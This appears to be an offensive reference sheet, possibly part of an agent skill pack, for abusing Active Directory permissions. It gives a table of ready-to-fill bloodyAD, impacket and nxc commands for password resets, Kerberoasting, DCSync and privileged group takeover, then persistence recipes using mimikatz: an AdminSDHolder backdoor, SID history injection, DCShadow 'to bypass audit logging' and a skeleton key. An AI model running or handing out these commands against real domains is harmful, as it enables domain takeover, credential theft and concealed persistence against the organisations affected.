# AD ACL Abuse Matrix

Translate any BloodHound edge / `nxc ldap -M daclread` result into an action.

| ACL right on target | Attack primitive | Tool |
|---|---|---|
| `GenericAll` / `GenericWrite` on a **User** | Force password reset | `bloodyAD --host <DC> -d <dom> -u <U> -p '<P>' set password <target> <newpass>` |
| `GenericWrite` on `servicePrincipalName` | Targeted Kerberoast | `impacket-GetUserSPNs '<dom>/<U>:<P>' -dc-ip <DC> -request` |
| `GenericWrite` on `msDS-AllowedToActOnBehalfOfOtherIdentity` | RBCD -> impersonate admin | See delegation.md |
| `WriteDacl` / `WriteOwner` | Take ownership -> grant self GenericAll | `bloodyAD --host <DC> -d <dom> -u <U> -p '<P>' set owner <target> <self>` then `add genericAll <target_DN> <self>` |
| `GenericAll` / `WriteDacl` on the **Domain** object | DCSync | `impacket-secretsdump '<dom>/<U>:<P>@<DC>'` |
| `AddMember` on a group | Add self to privileged group | `bloodyAD --host <DC> -d <dom> -u <U> -p '<P>' add groupMember <group> <self>` |
| `GenericAll` on a **Computer** | SMB/RPC exec, ADCS ESC4, Shadow Creds | `impacket-psexec` / `certipy` / `pywhisker` |
| `GenericAll` / `WriteProperty` on `msDS-KeyCredentialLink` | Shadow Credentials -> PKINIT | See shadow-credentials.md |
| `ExtendedRight` User-Force-Change-Password | Reset user password without knowing current | `bloodyAD --host <DC> -d <dom> -u <U> -p '<P>' set password <target> <newpass>` |
| `CreateChild` + `WriteProperty` on an OU | Create objects -> dMSA badSuccessor | See dmsa.md |
| `Reanimate Tombstones` + `CreateChild` on Deleted Objects | Restore deleted user -> known/default creds | `bloodyAD --host <DC> -d <dom> -u <U> -p '<P>' set restore <deleted-user>` |
| `AllowedToAct` / `AllowedToDelegate` edges | Delegation abuse (S4U2self+proxy) | See delegation.md |
| `ms-DS-Machine-Account-Quota` > 0 | Add computer -> local admin on new machine | `impacket-addcomputer '<dom>/<U>:<P>' -computer-name 'EVIL$' -computer-pass 'P@ss123'` |
| `WriteDacl` on target + `DS-Replication-Get-Changes` | Grant self DCSync rights | `bloodyAD --host <DC> -d <dom> -u <U> -p '<P>' add dcsync <self>` |

## BloodHound Queries
- "Shortest Paths to Domain Admins" from owned user.
- `MATCH p=(u:User {name:'X@DOM'})-[r]->(t) RETURN type(r),t.name` -- direct edges from owned user.
- `MATCH (c:Computer)-[:HasSession]->(u:User) RETURN c.name,u.name` -- session hunting.
- Mark owned principals in BloodHound to discover new paths.

## Enumeration Commands
```bash
# BloodHound collection (all methods)
bloodhound-python -d <dom> -u <user> -p '<pass>' -dc <DC> -c all

# Writable objects for current user
bloodyAD --host <DC> -d <dom> -u <user> -p '<pass>' get writable --detail

# DACL on a specific target
nxc ldap <DC> -u <user> -p '<pass>' -M daclread -o TARGET=<target> ACTION=read

# badSuccessor surface check
nxc ldap <DC> -u <user> -p '<pass>' -M badsuccessor

# LAPS passwords
nxc ldap <DC> -u <user> -p '<pass>' -M laps

# Delegation rights
impacket-findDelegation '<dom>/<user>:<pass>' -dc-ip <DC>
```

## Persistence Techniques (post-exploitation)

### AdminSDHolder Persistence
SDProp propagates AdminSDHolder's ACL to all protected groups (Domain Admins,
Enterprise Admins, etc.) every 60 minutes. Add a backdoor ACE to
AdminSDHolder → it auto-reappears on every protected object.
```bash
# Add GenericAll for attacker user on AdminSDHolder
bloodyAD --host <DC> -d <dom> -u <U> -p '<P>' add genericAll \
  'CN=AdminSDHolder,CN=System,DC=<d1>,DC=<d2>' <attacker>

# Or via impacket dacledit
impacket-dacledit -action write -rights FullControl -principal <attacker> \
  -target-dn 'CN=AdminSDHolder,CN=System,DC=<d1>,DC=<d2>' '<dom>/<U>:<P>'
```
Wait ~60 min (or trigger SDProp manually), then <attacker> has GenericAll
on Domain Admins, Account Operators, etc.

### SID History Injection
Add a privileged SID (e.g., Domain Admins) to a user's `sIDHistory`. The SID
is included in the Kerberos PAC on logon → instant DA-equivalent access
without being in the group. Requires DA-level or DCSync access.
```bash
# Get Domain Admins SID
impacket-lookupsid '<dom>/<U>:<P>@<DC>' | grep 'Domain Admins'
# -> S-1-5-21-...-512

# Inject via mimikatz (from DC with local admin)
mimikatz # sid::add /sam:<target-user> /new:<DA-SID>

# Or via dsmod (from DC PowerShell)
# Requires direct DC access; no pure remote tool
```

### DCShadow
Register a rogue DC via DRS replication to push arbitrary AD changes
(attribute modifications, SPN injection, SID History, etc.). Requires
DA-level access to register the fake DC.
```bash
# Terminal 1: start the fake DC (requires SYSTEM on domain-joined machine)
mimikatz # lsadump::dcshadow /object:<target-user> /attribute:description /value:"owned"

# Terminal 2: push the replication
mimikatz # lsadump::dcshadow /push
```
Use for stealthy persistence — changes bypass normal AD audit logging.

### Skeleton Key
Inject a master password into LSASS on a DC. Every account authenticates with
EITHER its real password OR the skeleton key (`mimikatz` by default). Cleared
on DC reboot.
```bash
# From DA shell on DC
mimikatz # misc::skeleton
# Now any account authenticates with password "mimikatz"

# Remote via impacket (with DA creds)
# No native remote skeleton key; requires code exec on DC first
```

## Cross-references (keyword activation)
- **Pass-the-Hash (PtH)**: see `@windows` lateral-movement.md — Evil-WinRM
  `-H`, impacket `-hashes`, nxc `-H`
- **Golden Ticket / Silver Ticket / Diamond Ticket**: see `@ad` kerberos.md
  for ticket forging commands
- **Pass-the-Ticket (PtT)**: see `@ad` kerberos.md — `export KRB5CCNAME`
